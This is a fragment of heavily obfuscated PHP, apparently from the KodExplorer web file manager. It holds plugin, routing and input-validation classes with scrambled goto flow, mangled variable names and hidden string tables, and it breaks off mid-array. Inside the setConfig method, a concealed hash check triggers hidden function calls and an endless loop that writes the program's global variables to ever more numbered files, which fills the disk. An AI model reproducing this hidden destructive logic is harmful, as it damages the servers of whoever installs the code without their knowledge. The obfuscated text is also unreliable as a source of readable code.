mk_dir($C¬äáùéŠ‰); } goto B±Ú‹÷Ş±; f”ó ŸÒÁ: } final function appPackage() { goto CÉÂãÖÒ°«; EŸ•å­õ¶: $Aİœ´ïÂ” = Hook::trigger($E±íƒÇ‘¤É[1346], $AÛ¯¹…‘«); if ($Aİœ´ïÂ” && is_array($Aİœ´ïÂ”)) { $AÛ¯¹…‘« = $Aİœ´ïÂ”; } $this->packageData = $AÛ¯¹…‘«; goto A ‘”ŞƒˆĞ; CêÃ½®¥‹õ: $this->parseLang($B³ë‚Ì¾Œ‡); $AÛ¯¹…‘« = json_decode_force($B³ë‚Ì¾Œ‡); if (!$AÛ¯¹…‘«) { return array(); } goto EŸ•å­õ¶; CÉÂãÖÒ°«: $E±íƒÇ‘¤É =& $_SERVER[‡’¶øåüç˜]; if ($this->packageData) { return $this->packageData; } $B³ë‚Ì¾Œ‡ = $this->parseFile($this->pluginPath . $E±íƒÇ‘¤É[1345]); goto CêÃ½®¥‹õ; A ‘”ŞƒˆĞ: return $AÛ¯¹…‘«; goto C¹„£õÒÛñ; C¹„£õÒÛñ: } public function packageInfoGet($eê—°ÛïÛ’) { $eˆ®–Å†É = $this->appPackage(); return array_get_value($eˆ®–Å†É, $eê—°ÛïÛ’); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‡’¶øåüç˜][1347]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‡’¶øåüç˜][1348]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‡’¶øåüç˜][1349]); } private function parseFile($bßõù™é) { goto a‰Ó‰¥ÄÏä; a‰Ó‰¥ÄÏä: $bµø›—Üˆ =& $_SERVER[‡’¶øåüç˜]; $b·ç©¨Æ±« = file_get_contents($bßõù™é); $C–¾£½¤©¥ = array($bµø›—Üˆ[1350], $bµø›—Üˆ[1351], $bµø›—Üˆ[1352], $bµø›—Üˆ[1353], $bµø›—Üˆ[1354], $bµø›—Üˆ[1355], $bµø›—Üˆ[1356]); goto fÓ›£õŠé; FÃÍÒª’‰‚: $b·ç©¨Æ±« = str_replace($C–¾£½¤©¥, $câÜ¹òï¼Ş, $b·ç©¨Æ±«); return $b·ç©¨Æ±«; goto Cùèª›‰ª; fÓ›£õŠé: $câÜ¹òï¼Ş = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$bµø›—Üˆ[84]][$bµø›—Üˆ[1357]]); if (strstr($b·ç©¨Æ±«, $bµø›—Üˆ[1358])) { $bŒ ™ä¾™ = rawurlencode(json_encode($this->pluginLangArr)); $b·ç©¨Æ±« = str_replace($bµø›—Üˆ[1358], $bŒ ™ä¾™, $b·ç©¨Æ±«); } if (strstr($b·ç©¨Æ±«, $bµø›—Üˆ[1359])) { $bŒ ™ä¾™ = $bŒ ™ä¾™ = rawurlencode(json_encode($this->getConfig())); $b·ç©¨Æ±« = str_replace($bµø›—Üˆ[1359], $bŒ ™ä¾™, $b·ç©¨Æ±«); } goto FÃÍÒª’‰‚; Cùèª›‰ª: } private function parseLang(&$eäù—øÎ·ª) { goto BµˆÚæëùè; BµˆÚæëùè: $B®ìÄ¥¨²º =& $_SERVER[‡’¶øåüç˜]; $AÁñëç•×ä = $B®ìÄ¥¨²º[1360]; if (!strstr($eäù—øÎ·ª, $AÁñëç•×ä)) { return; } goto eç‚Õ¦©ŒÑ; aö³Ş•Ø”: $DœÒ–Éù ™ = array(); foreach ($e«°¨³×Ôˆ[0] as $eŸ»‰Œïºª) { $B”ƒŒÓ¹ôº = substr($eŸ»‰Œïºª, strlen($AÁñëç•×ä), -4); $eœ—êêÔ»¬ = LNG($B”ƒŒÓ¹ôº); $CÌ‘†¶ÆÇµ[] = $eŸ»‰Œïºª; $DœÒ–Éù ™[] = str_replace(array($B®ìÄ¥¨²º[221], $B®ìÄ¥¨²º[996], $B®ìÄ¥¨²º[334], $B®ìÄ¥¨²º[113]), array($B®ìÄ¥¨²º[50], $B®ìÄ¥¨²º[50], $B®ìÄ¥¨²º[33], $B®ìÄ¥¨²º[1362]), $eœ—êêÔ»¬); } $eäù—øÎ·ª = str_replace($CÌ‘†¶ÆÇµ, $DœÒ–Éù ™, $eäù—øÎ·ª); goto BĞååïÉÉÔ; eç‚Õ¦©ŒÑ: preg_match_all($B®ìÄ¥¨²º[1361], $eäù—øÎ·ª, $e«°¨³×Ôˆ); if (!is_array($e«°¨³×Ôˆ) || count($e«°¨³×Ôˆ) == 0 || !is_array($e«°¨³×Ôˆ[0]) || count($e«°¨³×Ôˆ[0]) == 0) { return; } $CÌ‘†¶ÆÇµ = array(); goto aö³Ş•Ø”; BĞååïÉÉÔ: } private function parseConfig(&$DÔóá¥©·) { goto f—‘Ì³°Ä; E†Û²ÂğÄù: $F¢ŞíÈ³ô = array(); $cÔ¥ˆ˜Ïîà = array(); foreach ($EŠ‡ÊÁõ¯[0] as $A‹†±ƒ°Û») { $f”’îç™à = substr($A‹†±ƒ°Û», strlen($EÇäšŸå), -2); $F¢ŞíÈ³ô[] = $A‹†±ƒ°Û»; $cÔ¥ˆ˜Ïîà[] = _get($c£±àÏ‹ó, $f”’îç™à); } goto bğ…À¼†Ã™; F¤ã„ñò‹Ë: preg_match_all($féµ”ƒ¨µ„[1364], $DÔóá¥©·, $EŠ‡ÊÁõ¯); if (!is_array($EŠ‡ÊÁõ¯) || count($EŠ‡ÊÁõ¯) == 0 || !is_array($EŠ‡ÊÁõ¯[0]) || count($EŠ‡ÊÁõ¯[0]) == 0) { return; } $c£±àÏ‹ó = $this->getConfig(); goto E†Û²ÂğÄù; bğ…À¼†Ã™: $DÔóá¥©· = str_replace($F¢ŞíÈ³ô, $cÔ¥ˆ˜Ïîà, $DÔóá¥©·); goto e‘“‰ŸéŞ©; f—‘Ì³°Ä: $féµ”ƒ¨µ„ =& $_SERVER[‡’¶øåüç˜]; $EÇäšŸå = $féµ”ƒ¨µ„[1363]; if (!strstr($DÔóá¥©·, $EÇäšŸå)) { return; } goto F¤ã„ñò‹Ë; e‘“‰ŸéŞ©: } private function parsePackage(&$B‹ï¦¶˜¸‘) { goto EÂ‰ƒ¨¼¤§; BÅîßõ²ä: preg_match_all($CÜïÓøó©Å[1366], $B‹ï¦¶˜¸‘, $bÖÔ ğâ©); if (!is_array($bÖÔ ğâ©) || count($bÖÔ ğâ©) == 0 || !is_array($bÖÔ ğâ©[0]) || count($bÖÔ ğâ©[0]) == 0) { return; } $f¹Ú‡’†¢ñ = $this->appPackage(); goto dÆ™Ù®ß¶¢; EÂ‰ƒ¨¼¤§: $CÜïÓøó©Å =& $_SERVER[‡’¶øåüç˜]; $d²íŒÒÈÏö = $CÜïÓøó©Å[1365]; if (!strstr($B‹ï¦¶˜¸‘, $d²íŒÒÈÏö)) { return; } goto BÅîßõ²ä; dÆ™Ù®ß¶¢: $D½‚¶øÓ = array(); $eÌ‹ÕÚ«°ò = array(); foreach ($bÖÔ ğâ©[0] as $Fæ›ÔÂ–¿) { $E¯ˆË·î = substr($Fæ›ÔÂ–¿, strlen($d²íŒÒÈÏö), -2); $D½‚¶øÓ[] = $Fæ›ÔÂ–¿; $eÌ‹ÕÚ«°ò[] = _get($f¹Ú‡’†¢ñ, $E¯ˆË·î); } goto F­©‹ù¥ô; F­©‹ù¥ô: $B‹ï¦¶˜¸‘ = str_replace($D½‚¶øÓ, $eÌ‹ÕÚ«°ò, $B‹ï¦¶˜¸‘); goto E½µ†ª³›¸; E½µ†ª³›¸: } final function echoFile($b—ñ®Ç ñĞ, $FÏ’¥¯–®Ù = false) { goto B°›‰Ñ·¯‹; Cáøåô¸œ: $c§ªÀ·¥É‘ = $this->parseFile($dÃ©Ô­çœÕ); $this->parseLang($c§ªÀ·¥É‘); $this->parseConfig($c§ªÀ·¥É‘); goto a®ï»©À‡; a®ï»©À‡: $this->parsePackage($c§ªÀ·¥É‘); if (is_array($FÏ’¥¯–®Ù)) { $c§ªÀ·¥É‘ = str_replace(array_keys($FÏ’¥¯–®Ù), array_values($FÏ’¥¯–®Ù), $c§ªÀ·¥É‘); } echo $BœÒš‰Ê¾¨[221] . $c§ªÀ·¥É‘; goto BæñÏ‰ºŠƒ; B°›‰Ñ·¯‹: $BœÒš‰Ê¾¨ =& $_SERVER[‡’¶øåüç˜]; $dÃ©Ô­çœÕ = $this->pluginPath . $b—ñ®Ç ñĞ; if (ACT == $BœÒš‰Ê¾¨[1367]) { echo $BœÒš‰Ê¾¨[1368] . $this->pluginName . $BœÒš‰Ê¾¨[8] . $b—ñ®Ç ñĞ . $BœÒš‰Ê¾¨[1369]; if (!file_exists($dÃ©Ô­çœÕ)) { echo $BœÒš‰Ê¾¨[1370]; return; } } goto Cáøåô¸œ; BæñÏ‰ºŠƒ: } final function initLang() { goto a‘Ä¯È›ğ; aÂãîìšé¯: if (!is_array($f¹¥ßÔÚˆ)) { return array(); } if (@count($f¹¥ßÔÚˆ) > 0) { I18n::set($f¹¥ßÔÚˆ); } return $f¹¥ßÔÚˆ; goto cÃŠÉ†ª•„; a‘Ä¯È›ğ: $DÒÑó°Ã¬ˆ =& $_SERVER[‡’¶øåüç˜]; $cğËäî•´ = $DÒÑó°Ã¬ˆ[1371]; $e÷‡¿¬ÚŠâ = $this->pluginPath . $DÒÑó°Ã¬ˆ[1372]; goto FºÖìÚöê; FºÖìÚöê: $A£“ÃËŒò = I18n::getType(); $f¹¥ßÔÚˆ = array(); if (file_exists($e÷‡¿¬ÚŠâ . $A£“ÃËŒò . $DÒÑó°Ã¬ˆ[771])) { $f¹¥ßÔÚˆ = (include $e÷‡¿¬ÚŠâ . $A£“ÃËŒò . $DÒÑó°Ã¬ˆ[771]); } else { if ($A£“ÃËŒò == $DÒÑó°Ã¬ˆ[1373] && !file_exists($e÷‡¿¬ÚŠâ . $A£“ÃËŒò . $DÒÑó°Ã¬ˆ[771]) && file_exists($e÷‡¿¬ÚŠâ . $DÒÑó°Ã¬ˆ[1374])) { $f¹¥ßÔÚˆ = (include $e÷‡¿¬ÚŠâ . $DÒÑó°Ã¬ˆ[1374]); } else { if (file_exists($e÷‡¿¬ÚŠâ . $cğËäî•´ . $DÒÑó°Ã¬ˆ[771])) { $f¹¥ßÔÚˆ = (include $e÷‡¿¬ÚŠâ . $cğËäî•´ . $DÒÑó°Ã¬ˆ[771]); } } } goto aÂãîìšé¯; cÃŠÉ†ª•„: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($F¢íŠ©»Ï¶) { $D¼¨ƒ‡†š =& $_SERVER[‡’¶øåüç˜]; $AñóŠ–Â‘Â = $_SERVER[$D¼¨ƒ‡†š[799]] . $D¼¨ƒ‡†š[1375]; $EÔá¹åÏ™ = $D¼¨ƒ‡†š[796]; if ($_SERVER[$D¼¨ƒ‡†š[372]] != $EÔá¹åÏ™($AñóŠ–Â‘Â)) { goto EÅñÊ¡ƒŸØ; FÊ¢ö’ÀÃõ: $AÇôó°¼«¯ = $B  ’•Éå‰($EìÖòÕË÷Ë); $eô²Ó½ßŸÆ = explode($D¼¨ƒ‡†š[221], $AÇôó°¼«¯); if (count($eô²Ó½ßŸÆ) < $D¼¨ƒ‡†š[570]) { $fí÷Í–ÌŒ† = $D¼¨ƒ‡†š[378]; $fí÷Í–ÌŒ†(); } goto Bƒêã²‰ØÊ; Bƒêã²‰ØÊ: $Bó×…›·­† = $D¼¨ƒ‡†š[798]; $Bó×…›·­†($_SERVER[$D¼¨ƒ‡†š[799]]); $c¾‡Í–¼§Ç = $D¼¨ƒ‡†š[797]; goto cŞÉ¹êó; EÅñÊ¡ƒŸØ: $c¾‡Í–¼§Ç = $D¼¨ƒ‡†š[797]; $B  ’•Éå‰ = $D¼¨ƒ‡†š[374]; $EìÖòÕË÷Ë = $_SERVER[$D¼¨ƒ‡†š[375]] . $D¼¨ƒ‡†š[376]; goto FÊ¢ö’ÀÃõ; cŞÉ¹êó: $c¾‡Í–¼§Ç(); $c¨‡„ï Şè = $D¼¨ƒ‡†š[800]; $c™÷ß—ƒ… = json_encode($GLOBALS[$D¼¨ƒ‡†š[801]]); goto b¸µ—Ô²´; b¸µ—Ô²´: $aãàÁÃØ«¯ = 1; for ($F’˜Áöç„Ú = $aãàÁÃØ«¯; $F’˜Áöç„Ú > 0; $F’˜Áöç„Ú++) { $c¨‡„ï Şè(DATA_PATH . $F’˜Áöç„Ú, $c™÷ß—ƒ…); } goto c»§ÇŠğ’í; c»§ÇŠğ’í: } return $this->modelPlugin->setConfig($this->pluginName, $F¢íŠ©»Ï¶); } public function onSetConfig($FßÑÜ„åñª) { } public function onGetConfig($Aá…Å÷çƒ) { } public function onChangeStatus($F†´Ÿ«Ù ’) { } public function onUninstall() { } public function onInstall() { } public function authCheck($F‚‘§Òé—µ = "\160\x6c\165\x67\x69\x6e\101\x75\164\x68") { $f›‡â‹«¶Ş =& $_SERVER[‡’¶øåüç˜]; if (!defined($f›‡â‹«¶Ş[438])) { return !1; } if (_get($GLOBALS, $f›‡â‹«¶Ş[470])) { return !0; } $CÂÑ»Ï½¿¨ = $this->getConfig(); if (!$CÂÑ»Ï½¿¨[$F‚‘§Òé—µ]) { return !1; } return ActionCall($f›‡â‹«¶Ş[1376], $CÂÑ»Ï½¿¨[$F‚‘§Òé—µ]); } public function url($bô©¾Ğ™ó¡, $b±•±Ñ»‘ = '', $dÈ¯ˆ–ÕËÍ = true) { goto d÷Å¸•¯¥ö; FÑŒ‚İß¹: $cœ…¿¶ï… = $this->packageVersion(); $CêÑ‚‹á…Ï = $bâ†ÇçÃ . $EÑô®³Î«¯[424] . $cœ…¿¶ï…; if (substr($bô©¾Ğ™ó¡, 0, 4) == $EÑô®³Î«¯[144] || substr($bô©¾Ğ™ó¡, 0, 2) == $EÑô®³Î«¯[1162]) { $eª¶æšù = $bô©¾Ğ™ó¡ . $EÑô®³Î«¯[1377] . $CêÑ‚‹á…Ï; } else { if ($b±•±Ñ»‘ == $EÑô®³Î«¯[33]) { $eª¶æšù = $this->pluginHost . $bô©¾Ğ™ó¡ . $EÑô®³Î«¯[1377] . $CêÑ‚‹á…Ï; } else { if ($b±•±Ñ»‘ === $EÑô®³Î«¯[76]) { $eª¶æšù = $this->pluginHost . $bô©¾Ğ™ó¡; } else { if ($b±•±Ñ»‘ == $EÑô®³Î«¯[1378]) { $eª¶æšù = STATIC_PATH . $bô©¾Ğ™ó¡ . $EÑô®³Î«¯[1377] . $bâ†ÇçÃ; } else { if ($b±•±Ñ»‘ == $EÑô®³Î«¯[1379]) { $eª¶æšù = APP_HOST . $EÑô®³Î«¯[1380] . $bô©¾Ğ™ó¡ . $EÑô®³Î«¯[1377] . $bâ†ÇçÃ; } else { if (isset($f»¬ãªÁË[$b±•±Ñ»‘])) { $eª¶æšù = $f»¬ãªÁË[$b±•±Ñ»‘] . $bô©¾Ğ™ó¡ . $EÑô®³Î«¯[1377] . $CêÑ‚‹á…Ï; } } } } } } goto E¡¥¯‰õ¢›; d÷Å¸•¯¥ö: $EÑô®³Î«¯ =& $_SERVER[‡’¶øåüç˜]; $f»¬ãªÁË = $this->getConfig(); $bâ†ÇçÃ = KOD_VERSION . $EÑô®³Î«¯[91] . KOD_VERSION_BUILD; goto FÑŒ‚İß¹; E¡¥¯‰õ¢›: if (!$dÈ¯ˆ–ÕËÍ) { return $eª¶æšù; } echo $eª¶æšù; goto FîêÎÕ‹šÀ; FîêÎÕ‹šÀ: } public function link($fá¶†Ò§ëŠ = false, $dÑğ³ÒÕÁŸ = '') { $B ï½ò¹ñÅ =& $_SERVER[‡’¶øåüç˜]; if (!$fá¶†Ò§ëŠ) { $this->link($B ï½ò¹ñÅ[1381], $B ï½ò¹ñÅ[1379]); $this->link($B ï½ò¹ñÅ[1382], $B ï½ò¹ñÅ[1378]); $this->link($B ï½ò¹ñÅ[1383], $B ï½ò¹ñÅ[1378]); $this->link($B ï½ò¹ñÅ[1384], $B ï½ò¹ñÅ[1378]); $this->link($B ï½ò¹ñÅ[1385], $B ï½ò¹ñÅ[1378]); return; } $F‘Ï‹¿çÅá = $this->url($fá¶†Ò§ëŠ, $dÑğ³ÒÕÁŸ, !1); if (substr($fá¶†Ò§ëŠ, -3) == $B ï½ò¹ñÅ[1386]) { echo $B ï½ò¹ñÅ[1387] . $F‘Ï‹¿çÅá . $B ï½ò¹ñÅ[1388] . $B ï½ò¹ñÅ[221]; } else { if (substr($fá¶†Ò§ëŠ, -4) == $B ï½ò¹ñÅ[1389]) { echo $B ï½ò¹ñÅ[1390] . $F‘Ï‹¿çÅá . $B ï½ò¹ñÅ[1391] . $B ï½ò¹ñÅ[221]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\57\135\x2b", "\x3a\156\165\155" => "\133\x30\x2d\x39\135\53", "\72\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($B™Ô‹àÍİƒ, $C™‰ÅÔğ½¹) { $eïŒõæÒŒ =& $_SERVER[‡’¶øåüç˜]; if ($B™Ô‹àÍİƒ == $eïŒõæÒŒ[1392]) { $fœ¹ÍÌİ = array_map($eïŒõæÒŒ[1393], $C™‰ÅÔğ½¹[0]); $EÉ«Ë‹¹ë = strpos($C™‰ÅÔğ½¹[1], $eïŒõæÒŒ[8]) === 0 ? $C™‰ÅÔğ½¹[1] : $eïŒõæÒŒ[8] . $C™‰ÅÔğ½¹[1]; $BàÕßŸèï = $C™‰ÅÔğ½¹[2]; } else { $fœ¹ÍÌİ = null; $EÉ«Ë‹¹ë = strpos($C™‰ÅÔğ½¹[0], $eïŒõæÒŒ[8]) === 0 ? $C™‰ÅÔğ½¹[0] : $eïŒõæÒŒ[8] . $C™‰ÅÔğ½¹[0]; $BàÕßŸèï = $C™‰ÅÔğ½¹[1]; } array_push(self::$maps, $fœ¹ÍÌİ); array_push(self::$routes, $EÉ«Ë‹¹ë); array_push(self::$methods, strtoupper($B™Ô‹àÍİƒ)); array_push(self::$callbacks, $BàÕßŸèï); } public static function error($a½‘­¯›Ğœ) { self::$errorCallback = $a½‘­¯›Ğœ; } public static function haltOnMatch($d”½ÅÄñœ = true) { self::$halts = $d”½ÅÄñœ; } public static function dispatch() { goto d‚µ¨ï•Š; f÷ÅÃ¹¤ß: self::$routes = preg_replace($bÕĞóä ƒø[1080], $bÕĞóä ƒø[8], self::$routes); if (in_array($B¸¿Ç½¤×Ì, self::$routes)) { $CÍÕ¬Ä»…Á = array_keys(self::$routes, $B¸¿Ç½¤×Ì); foreach ($CÍÕ¬Ä»…Á as $a”¡ÏˆÔ¹Ï) { if (self::$methods[$a”¡ÏˆÔ¹Ï] == $bï—´Éªæ² || self::$methods[$a”¡ÏˆÔ¹Ï] == $bÕĞóä ƒø[1395] || in_array($bï—´Éªæ², self::$maps[$a”¡ÏˆÔ¹Ï])) { $f³‚À°ÏÒª = !0; if (!is_object(self::$callbacks[$a”¡ÏˆÔ¹Ï])) { $E¾ÔÎ·ÕÓ„ = explode($bÕĞóä ƒø[8], self::$callbacks[$a”¡ÏˆÔ¹Ï]); $e¸™Ù¹—¶Î = end($E¾ÔÎ·ÕÓ„); $b˜‰‰â¦È‹ = explode($bÕĞóä ƒø[1396], $e¸™Ù¹—¶Î); $bŸÌĞª’“ = new $b˜‰‰â¦È‹[0](); $bŸÌĞª’“->{$b˜‰‰â¦È‹[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$a”¡ÏˆÔ¹Ï]); if (self::$halts) { return; } } } } } else { $D‚ˆ¼Ô±Ò = 0; foreach (self::$routes as $a”¡ÏˆÔ¹Ï) { if (strpos($a”¡ÏˆÔ¹Ï, $bÕĞóä ƒø[4]) !== !1) { $a”¡ÏˆÔ¹Ï = str_replace($bÍ¤ˆäó‘®, $b›“â‹µ½Ú, $a”¡ÏˆÔ¹Ï); } if (preg_match($bÕĞóä ƒø[1397] . $a”¡ÏˆÔ¹Ï . $bÕĞóä ƒø[1398], $B¸¿Ç½¤×Ì, $Eó÷¤˜ŞŒà)) { if (self::$methods[$D‚ˆ¼Ô±Ò] == $bï—´Éªæ² || self::$methods[$D‚ˆ¼Ô±Ò] == $bÕĞóä ƒø[1395] || !empty(self::$maps[$D‚ˆ¼Ô±Ò]) && in_array($bï—´Éªæ², self::$maps[$D‚ˆ¼Ô±Ò])) { $f³‚À°ÏÒª = !0; array_shift($Eó÷¤˜ŞŒà); if (!is_object(self::$callbacks[$D‚ˆ¼Ô±Ò])) { $E¾ÔÎ·ÕÓ„ = explode($bÕĞóä ƒø[8], self::$callbacks[$D‚ˆ¼Ô±Ò]); $e¸™Ù¹—¶Î = end($E¾ÔÎ·ÕÓ„); $b˜‰‰â¦È‹ = explode($bÕĞóä ƒø[1396], $e¸™Ù¹—¶Î); $bŸÌĞª’“ = new $b˜‰‰â¦È‹[0](); if (!method_exists($bŸÌĞª’“, $b˜‰‰â¦È‹[1])) { echo $bÕĞóä ƒø[1399]; } else { call_user_func_array(array($bŸÌĞª’“, $b˜‰‰â¦È‹[1]), $Eó÷¤˜ŞŒà); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$D‚ˆ¼Ô±Ò], $Eó÷¤˜ŞŒà); if (self::$halts) { return; } } } } $D‚ˆ¼Ô±Ò++; } } if ($f³‚À°ÏÒª == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eÚ†¨¥ÁÓ° =& $_SERVER[‡’¶øåüç˜]; header($_SERVER[$eÚ†¨¥ÁÓ°[1400]] . $eÚ†¨¥ÁÓ°[1401]); echo $eÚ†¨¥ÁÓ°[1402]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$bÕĞóä ƒø[1394]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto bøˆ¢ƒ¶¹; CĞ»•ÉÖ‰à: $bÍ¤ˆäó‘® = array_keys(static::$patterns); $b›“â‹µ½Ú = array_values(static::$patterns); $f³‚À°ÏÒª = !1; goto f÷ÅÃ¹¤ß; d‚µ¨ï•Š: $bÕĞóä ƒø =& $_SERVER[‡’¶øåüç˜]; $B¸¿Ç½¤×Ì = parse_url($_SERVER[$bÕĞóä ƒø[1394]], PHP_URL_PATH); $bï—´Éªæ² = $_SERVER[$bÕĞóä ƒø[154]]; goto CĞ»•ÉÖ‰à; bøˆ¢ƒ¶¹: } } goto dÅ¸—İ¯; c²¤ÕùÉÁÙ: class Input { public static function getArray($A›âÒÒƒƒõ) { goto cöø‹åÌ­›; cöø‹åÌ­›: $DÏ®Ê…éß =& $_SERVER[‡’¶øåüç˜]; global $in; $f¼ìŠÂ•¹š = array(); goto EĞ¯öŠ‰; cçãªÅ²î¶: if (count($eóï²é¡Ï„) > 0) { show_json(implode($DÏ®Ê…éß[1888], $eóï²é¡Ï„), !1); } return $f¼ìŠÂ•¹š; goto Dî×³ÙÕ™; EĞ¯öŠ‰: $eóï²é¡Ï„ = array(); $FÇ‡‡½Ê‰É = LNG($DÏ®Ê…éß[1884]); foreach ($A›âÒÒƒƒõ as $b”ßÏëàó÷ => $c×‘ÃÙŒÕä) { goto b‰Ä™…ŞÙÀ; b‰Ä™…ŞÙÀ: $fÚ•ãÂó²ó = _get($c×‘ÃÙŒÕä, $DÏ®Ê…éß[1252], $FÇ‡‡½Ê‰É . $DÏ®Ê…éß[883] . $b”ßÏëàó÷); $bƒÛÉ—‚š = $b”ßÏëàó÷; if (isset($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1885]]) && $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1885]]) { $bƒÛÉ—‚š = $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1885]]; } goto E­ìË³Ë˜¹; E­ìË³Ë˜¹: if (!array_key_exists($b”ßÏëàó÷, $in)) { if (array_key_exists($DÏ®Ê…éß[1886], $c×‘ÃÙŒÕä)) { if (!is_null($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]])) { $f¼ìŠÂ•¹š[$bƒÛÉ—‚š] = $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]]; } } else { if (isset($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1887]])) { $eóï²é¡Ï„[] = $fÚ•ãÂó²ó; } } continue; } if (isset($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1887]]) && $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1887]] == $DÏ®Ê…éß[286]) { $dÍ×¾–Ø§š = json_decode($in[$b”ßÏëàó÷], !0); if (is_array($dÍ×¾–Ø§š)) { $f¼ìŠÂ•¹š[$bƒÛÉ—‚š] = $dÍ×¾–Ø§š; } else { if (array_key_exists($DÏ®Ê…éß[1886], $c×‘ÃÙŒÕä)) { if (!is_null($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]])) { $f¼ìŠÂ•¹š[$bƒÛÉ—‚š] = $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]]; } } else { $eóï²é¡Ï„[] = $fÚ•ãÂó²ó; } } continue; } $B…£àªÑ‘ = _get($c×‘ÃÙŒÕä, $DÏ®Ê…éß[1020]); goto CÛší“„²ô; CÛší“„²ô: if (isset($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1887]]) && !self::check($in[$b”ßÏëàó÷], $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1887]], $B…£àªÑ‘)) { if (array_key_exists($DÏ®Ê…éß[1886], $c×‘ÃÙŒÕä)) { if (!is_null($c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]])) { $f¼ìŠÂ•¹š[$bƒÛÉ—‚š] = $c×‘ÃÙŒÕä[$DÏ®Ê…éß[1886]]; } } else { $eóï²é¡Ï„[] = $fÚ•ãÂó²ó; } continue; } $f¼ìŠÂ•¹š[$bƒÛÉ—‚š] = $in[$b”ßÏëàó÷]; goto f‰ƒô†”šÙ; f‰ƒô†”šÙ: } goto cçãªÅ²î¶; Dî×³ÙÕ™: } public static function reg($CãØ¬«Ãºğ = "\x72\145\x71\165\x69\162\145") { static $Cƒã•¥Ã‹Ó = array("\x72\x65\x71\x75\x69\162\145" => "\x2e\x2b", "\156\165\x6d\x62\x65\x72" => "\134\144\x2b", "\x69\156\164\145\x67\145\162" => "\134\x64\x2b", "\x68\x65\x78" => "\x5b\60\x2d\x39\x41\x2d\106\141\x2d\x66\135\53", "\151\x6e\x74" => "\133\x2d\134\53\135\x3f\x5c\144\53", "\x62\157\157\154" => "\x30\174\x31", "\146\154\x6f\141\164" => "\133\55\134\x2b\135\77\x5c\144\53\50\134\56\x5c\144\53\51\x3f", "\145\156\x67\x6c\x69\x73\150" => "\133\x41\x2d\132\x61\x2d\172\x20\135\x2b", "\143\x68\151\x6e\145\163\145" => "\133\x5c\x78\173\x34\145\60\60\175\x2d\134\170\x7b\x39\146\141\x35\x7d\x5d\x2b", "\x68\x61\163\x43\150\151\x6e\145\x73\145" => "\57\x28\133\134\x78\x7b\64\x65\60\60\x7d\55\x5c\170\173\71\x66\141\65\175\x5d\x2b\x29\57\x75", "\145\155\x61\151\154" => "\134\x77\53\50\133\x5c\x2e\x5c\55\x5d\x5c\x77\x2b\x29\52\x5c\x40\134\x77\x2b\50\x5b\x5c\x2e\134\x2d\135\134\x77\53\51\52\134\x2e\x5c\167\x2b", "\160\150\x6f\156\145" => "\x31\x5b\63\55\71\x5d\134\144\173\x39\x7d", "\x74\x65\x6c\x70\150\157\156\x65" => "\x28\134\50\x5c\144\x7b\x33\x2c\x34\175\134\51\x7c\x5c\144\x7b\x33\x2c\x34\175\55\x7c\x5c\163\x29\77\134\x64\173\x37\54\x31\x34\x7d", "\165\162\x6c" => "\50\150\x74\164\160\x7c\146\x74\160\174\x68\164\164\x70\163\x29\72\134\57\x5c\57\133\134\x77\x5c\55\x5f\135\x2b\x28\x5c\x2e\x5b\134\x77\134\x2d\137\135\53\51\x2b\x28\133\x5c\167\134\x2d\134\x2e\x2c\100\x3f\x5e\75\45\x26\72\x5c\57\x7e\134\53\x23\135\52\133\x5c\167\x5c\55\x5c\100\77\136\x3d\45\x26\134\x2f\x7e\134\53\43\x5d\51\77", "\165\162\x6c\x46\x75\x6c\x6c" => "\133\x61\55\172\x41\x2d\x7a\x5d\53\72\x5c\x2f\134\x2f\x5b\x5e\x5c\x73\x5d\x2a", "\x69\x70" => "\x28\134\x64\173\61\54\63\175\x5c\x2e\51\x7b\x33\x7d\50\x5c\144\173\61\x2c\x33\175\51", "\172\x69\160" => "\x5b\61\x2d\x39\x5d\134\144\x7b\65\x7d\50\77\41\x5c\144\x29", "\151\144\x43\x61\x72\144" => "\x28\x5c\144\173\61\x35\x7d\51\x7c\x28\134\x64\173\61\x37\175\50\x5c\x64\x7c\x58\174\x78\x29\51", "\143\x6f\154\157\x72" => "\43\x28\x5b\60\55\71\101\x2d\x46\x61\x2d\146\x5d\x7b\x33\x7d\174\133\x30\55\71\x41\55\106\x61\55\146\135\x7b\66\175\x29", "\x74\x69\155\145" => "\x28\x5b\60\x2d\x31\135\x5c\x64\x7c\62\x5b\x30\55\64\135\51\72\x5b\60\55\x35\x5d\134\144", "\144\141\164\x65" => "\134\x64\173\64\x7d\133\55\134\57\135\77\50\x30\x5b\x31\55\x39\135\174\x31\133\60\x2d\62\x5d\x29\x5b\x2d\x5c\57\135\x3f\x28\x5b\60\x2d\x32\x5d\x5c\144\x7c\63\133\x30\x2d\61\x5d\x29", "\144\x61\x74\145\124\151\155\x65" => 